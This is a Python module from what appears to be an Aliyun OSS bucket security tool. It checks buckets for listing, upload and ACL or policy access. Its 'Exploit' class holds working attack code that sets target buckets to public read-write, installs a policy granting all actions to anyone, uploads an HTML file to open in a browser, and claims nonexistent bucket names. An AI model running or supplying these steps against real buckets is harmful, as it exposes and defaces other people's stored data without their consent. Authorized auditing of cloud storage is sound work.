#!/usr/bin/python3.8.4 (python版本)
# -*- coding: utf-8 -*-
# @Author  : UzJu@菜菜狗
# @Email   : UzJuer@163.com
# @Software: PyCharm
# @Time    : 2022/7/2 14:22
# @File    : oss.py
import json
import os
from itertools import islice
from config.logs import logger
from config import conf
import oss2


class Aliyun_Oss_Bucket_Check:
    def __init__(self, target, location):
        """
        :desc: class init need to pass in the bucket name and region
        :param target: bucket name
        :param location: bucket
        """
        self.target = target
        self.location = location
        init_auth = oss2.Auth(conf.aliyun_id, conf.aliyun_key)
        self.bucket = oss2.Bucket(init_auth, f"{location}.aliyuncs.com", self.target)

    def Aliyun_Oss_GetBucketObject_List(self):
        """
        :desc: List objects in a bucket
        :return: True/False
        """
        try:
            for Object in islice(oss2.ObjectIterator(self.bucket), 3):
                logger.log("INFOR", f"Object Name: {Object.key}")
            return True
        except oss2.exceptions.AccessDenied:
            return False
        except Exception as e:
            """
            :desc: This indicates that the content returned by the bucket is not in the common format of the bucket, etc.
            """
            logger.log("ERROR", repr(e))
            return False

    def Aliyun_Oss_PutBucketObject(self):
        """
        :desc: Upload objects to buckets
        :return: True/False
        """
        try:
            self.bucket.put_object_from_file('UzJu.txt', f'{os.getcwd()}/config/UzJu.html')
            return True
        except oss2.exceptions.AccessDenied:
            return False
        except Exception as e:
            """
            :desc: This indicates that the content returned by the bucket is not in the common format of the bucket, etc.
            """
            logger.log("ERROR", repr(e))
            return False

    def Aliyun_Oss_GetBucketAcl(self):
        """
        :desc: get bucket acl
        :return: True/False
        """
        try:
            logger.log("INFOR", f"Target: {self.target} Bucket Acl: {self.bucket.get_bucket_acl().acl}")
            return True
        except oss2.exceptions.AccessDenied:
            return False
        except Exception as e:
            """
            :desc: This indicates that the content returned by the bucket is not in the common format of the bucket, etc.
            """
            logger.log("ERROR", repr(e))
            return False

    def Aliyun_Oss_PutBucketAcl(self):
        """
        :desc: put bucket acl
        :return: True/False
        """
        try:
            self.bucket.put_bucket_acl(oss2.BUCKET_ACL_PUBLIC_READ_WRITE)
            return True
        except oss2.exceptions.AccessDenied:
            return False
        except Exception as e:
            """
            :desc: This indicates that the content returned by the bucket is not in the common format of the bucket, etc.
            """
            logger.log("ERROR", repr(e))
            return False

    def Aliyun_Oss_GetBucketPolicy(self):
        """
        :desc: get public bucket policy
        :return: policy_json / False
        """
        try:
            result = self.bucket.get_bucket_policy()
            policy_json = json.loads(result.policy)
            return policy_json
        except oss2.exceptions.AccessDenied:
            return False
        except oss2.exceptions.NoSuchBucketPolicy:
            logger.log("ALERT", "There is no Policy policy for the current storage bucket")
            return False
        except Exception as e:
            """
            :desc: This indicates that the content returned by the bucket is not in the common format of the bucket, etc.
            """
            logger.log("ERROR", repr(e))
            return False

    def Aliyun_Oss_BucketDoesBucketExist(self):
        """
        :desc: Check whether the storage bucket exists
        :return: True/False
        """
        try:
            self.bucket.get_bucket_info()
            return False
        except oss2.exceptions.NoSuchBucket:
            return True
        except Exception as e:
            logger.log("ERROR", f"Target: {self.target} Except INFO: {e}")
            return False


class Aliyun_Oss_Bucket_Exploit:
    def __init__(self, target, location):
        """
        :desc: class init need to pass in the bucket name and region
        :param target: bucket name
        :param location: bucket
        """
        self.target = target
        self.location = location
        init_auth = oss2.Auth(conf.aliyun_id, conf.aliyun_key)
        self.bucket = oss2.Bucket(init_auth, f"http://{location}.aliyuncs.com", self.target)

    def Aliyun_Oss_CreateBucket_Exp(self):
        try:
            self.bucket.create_bucket()
            logger.log("INFOR", f"BucketName {self.target} Ceate Success:)")
        except Exception as e:
            logger.log("ERROR", f"BucketName {self.target} Ceate FAILD:( {e}")
            return False

    def Aliyun_Oss_PutBucketAcl_Exp(self):
        try:
            self.bucket.put_bucket_acl(oss2.BUCKET_ACL_PUBLIC_READ_WRITE)
            logger.log("INFOR", f"BucketName {self.target} Acl Permissions PUBLIC_READ_WRITE:)")
        except Exception as e:
            logger.log("ERROR", f"BucketName {self.target} Acl Put FAILD:( {e}")

    def Aliyun_Oss_PutBucketPolicy_Exp(self):
        try:
            bucket_info = self.bucket.get_bucket_info()
            strategy = {
                "Version": "1",
                "Statement": [{
                    "Effect": "Allow",
                    "Action": [
                        "oss:*"
                    ],
                    "Principal": [
                        "*"
                    ],
                    "Resource": [
                        f"acs:oss:*:{bucket_info.owner.id}:{self.target}",
                        f"acs:oss:*:{bucket_info.owner.id}:{self.target}/*"
                    ]
                }]
            }

            self.bucket.put_bucket_policy(json.dumps(strategy))
            logger.log("INFOR", f"BucketName {self.target} Policy Put Success :)")
        except Exception as e:
            logger.log("ERROR", f"BucketName {self.target} Policy Put FAILD:( {e}")

    def Aliyun_Oss_GetBucketPolicy_Exp(self):
        try:
            result = self.bucket.get_bucket_policy()
            policy_json = json.loads(result.policy)
            logger.log("INFOR", f"BucketName {self.target} Policy Get Success :)\n {policy_json}")
        except Exception as e:
            logger.log("ERROR", f"BucketName {self.target} Policy Get FAILD:( {e}")

    def Aliyun_Oss_PutObject_Exp(self):
        try:
            self.bucket.put_object_from_file("UzJu.html", f"{os.getcwd()}/config/UzJu.html")
            logger.log("INFOR", f"BucketName {self.target} Put Object Success:)")
            logger.log("INFOR", f"Go Browser Open {self.target}.{self.location}.aliyuncs.com/UzJu.html")

        except Exception as e:
            logger.log("ERROR", f"BucketName {self.target} Put Object FAILD:( {e}")
